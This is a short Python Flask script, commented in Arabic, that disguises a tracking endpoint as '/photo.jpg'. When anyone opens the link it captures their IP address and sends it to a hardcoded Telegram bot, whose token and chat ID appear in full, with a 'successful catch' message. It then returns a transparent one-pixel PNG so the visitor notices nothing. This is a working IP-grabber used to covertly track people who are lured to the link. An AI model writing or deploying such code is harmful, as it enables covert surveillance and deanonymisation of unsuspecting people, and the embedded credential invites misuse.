from flask import Flask, request, send_file
import requests
import io

app = Flask(__name__)

# التوكن المصحح من صورة BotFather مباشرة
TOKEN = "8459471902:AAHLHHiOWWAQS0zvn6TFWMWuZR0r9cf_CUo"
CHAT_ID = "8524242091"

@app.route('/')
@app.route('/photo.jpg')
def index():
    # جلب الـ IP
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
    
    # محاولة الإرسال للبوت
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": f"✅ تم الصيد بنجاح!\n🌐 IP: {ip}",
        "parse_mode": "HTML"
    }
    
    try:
        # استخدام POST لضمان وصول البيانات بشكل سليم
        requests.post(url, json=payload, timeout=10)
    except:
        pass

    # إرجاع البكسل الشفاف (الذي رأيته في صورتك السابقة)
    pixel = io.BytesIO(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82')
    return send_file(pixel, mimetype='image/png')
